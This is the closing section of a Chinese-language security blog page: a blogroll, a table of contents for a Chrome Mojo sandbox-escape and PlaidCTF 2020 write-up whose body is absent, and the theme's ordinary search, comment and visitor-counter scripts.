                  <li class="links-of-blogroll-item">
                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://elphet.blogspot.com" title="bobb" target="_blank">bobb</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://thunderjie.github.io/" title="Thunderj" target="_blank">Thunderj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://dwfault.github.io/" title="dwfalut" target="_blank">dwfalut</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://pcat.cc/" title="pcat" target="_blank">pcat</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup"><span class="nav-number">1.</span> <span class="nav-text">chrome sandbox escape case study and plaidctf2020 mojo writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mojo"><span class="nav-number">1.1.</span> <span class="nav-text">mojo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Intro-to-Mojo-amp-Services"><span class="nav-number">1.1.1.</span> <span class="nav-text">Intro to Mojo &amp; Services</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mojo术语"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">mojo术语</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#定义一个新的Frame-Interface"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">定义一个新的Frame Interface</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#定义一个interface"><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">定义一个interface</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#创建pipe"><span class="nav-number">1.1.1.2.2.</span> <span class="nav-text">创建pipe</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#发送message"><span class="nav-number">1.1.1.2.3.</span> <span class="nav-text">发送message</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#发送PendingReceiver给Browser"><span class="nav-number">1.1.1.2.4.</span> <span class="nav-text">发送PendingReceiver给Browser</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实现interface"><span class="nav-number">1.1.1.2.5.</span> <span class="nav-text">实现interface</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mojo-Basics"><span class="nav-number">1.1.2.</span> <span class="nav-text">Mojo Basics</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Interfaces"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">Interfaces</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Message-Pipes"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">Message Pipes</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mojo-Remote-BindNewPipeAndPassReceiver"><span class="nav-number">1.1.2.2.1.</span> <span class="nav-text">mojo::Remote::BindNewPipeAndPassReceiver</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mojo-Receiver-BindNewPipeAndPassRemote"><span class="nav-number">1.1.2.2.2.</span> <span class="nav-text">mojo::Receiver::BindNewPipeAndPassRemote</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mojo-PendingRemote-InitWithNewPipeAndPassReceiver"><span class="nav-number">1.1.2.2.3.</span> <span class="nav-text">mojo::PendingRemote::InitWithNewPipeAndPassReceiver</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mojo-Remote-mojo-Receiver-and-mojo-PendingRemote-mojo-PendingReceiver"><span class="nav-number">1.1.2.2.4.</span> <span class="nav-text">mojo::Remote&#x2F;mojo::Receiver and mojo::PendingRemote&#x2F;mojo::PendingReceiver</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mojo-C-Bindings-API"><span class="nav-number">1.1.3.</span> <span class="nav-text">Mojo C++ Bindings API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Getting-Started"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">Getting Started</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Interfaces-1"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">Interfaces</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Basic-Usage"><span class="nav-number">1.1.3.2.1.</span> <span class="nav-text">Basic Usage</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Remote-and-PendingReceiver"><span class="nav-number">1.1.3.2.2.</span> <span class="nav-text">Remote and PendingReceiver</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Creating-Interface-Pipes"><span class="nav-number">1.1.3.2.3.</span> <span class="nav-text">Creating Interface Pipes</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Binding-a-Pending-Receiver"><span class="nav-number">1.1.3.2.4.</span> <span class="nav-text">Binding a Pending Receiver</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Receiving-Responses"><span class="nav-number">1.1.3.2.5.</span> <span class="nav-text">Receiving Responses</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sending-Interfaces-Over-Interfaces"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">Sending Interfaces Over Interfaces</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Sending-Pending-Receivers"><span class="nav-number">1.1.3.3.1.</span> <span class="nav-text">Sending Pending Receivers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Sending-Remote"><span class="nav-number">1.1.3.3.2.</span> <span class="nav-text">Sending Remote</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Other-Interface-Binding-Types"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">Other Interface Binding Types</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Self-owned-Receivers"><span class="nav-number">1.1.3.4.1.</span> <span class="nav-text">Self-owned Receivers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Receiver-Sets"><span class="nav-number">1.1.3.4.2.</span> <span class="nav-text">Receiver Sets</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Remote-Sets"><span class="nav-number">1.1.3.4.3.</span> <span class="nav-text">Remote Sets</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Associated-Interfaces"><span class="nav-number">1.1.3.5.</span> <span class="nav-text">Associated Interfaces</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Mojom"><span class="nav-number">1.1.3.5.1.</span> <span class="nav-text">Mojom</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Passing-pending-associated-receivers"><span class="nav-number">1.1.3.5.2.</span> <span class="nav-text">Passing pending associated receivers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Passing-associated-remotes"><span class="nav-number">1.1.3.5.3.</span> <span class="nav-text">Passing associated remotes</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mojo-JavaScript-Bindings-API"><span class="nav-number">1.1.4.</span> <span class="nav-text">Mojo JavaScript Bindings API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Getting-Started-1"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">Getting Started</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Interfaces-2"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">Interfaces</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Interface-Pointer-and-Request"><span class="nav-number">1.1.4.2.1.</span> <span class="nav-text">Interface Pointer and Request</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Binding-an-InterfaceRequest"><span class="nav-number">1.1.4.2.2.</span> <span class="nav-text">Binding an InterfaceRequest</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Receiving-Responses-1"><span class="nav-number">1.1.4.2.3.</span> <span class="nav-text">Receiving Responses</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#async和await"><span class="nav-number">1.2.</span> <span class="nav-text">async和await</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#case-study-RenderFrameHost-lifetime-cause-sandbox-escape"><span class="nav-number">1.3.</span> <span class="nav-text">case study: RenderFrameHost lifetime cause sandbox escape</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#plaidctf2020-mojo-writeup"><span class="nav-number">1.4.</span> <span class="nav-text">plaidctf2020 mojo writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#root-cause-analysis"><span class="nav-number">1.4.1.</span> <span class="nav-text">root cause analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug"><span class="nav-number">1.4.2.</span> <span class="nav-text">debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oob-leak-and-gadget"><span class="nav-number">1.4.3.</span> <span class="nav-text">oob leak and gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF"><span class="nav-number">1.4.4.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整exploit"><span class="nav-number">1.4.5.</span> <span class="nav-text">完整exploit</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sakura</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'oSjxVuchxdK82iyIiuzHtfiV-gzGzoHsz',
        appKey: 'MK8tCWwU3RWlWQdEA0wOH8Dw',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("oSjxVuchxdK82iyIiuzHtfiV-gzGzoHsz", "MK8tCWwU3RWlWQdEA0wOH8Dw");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
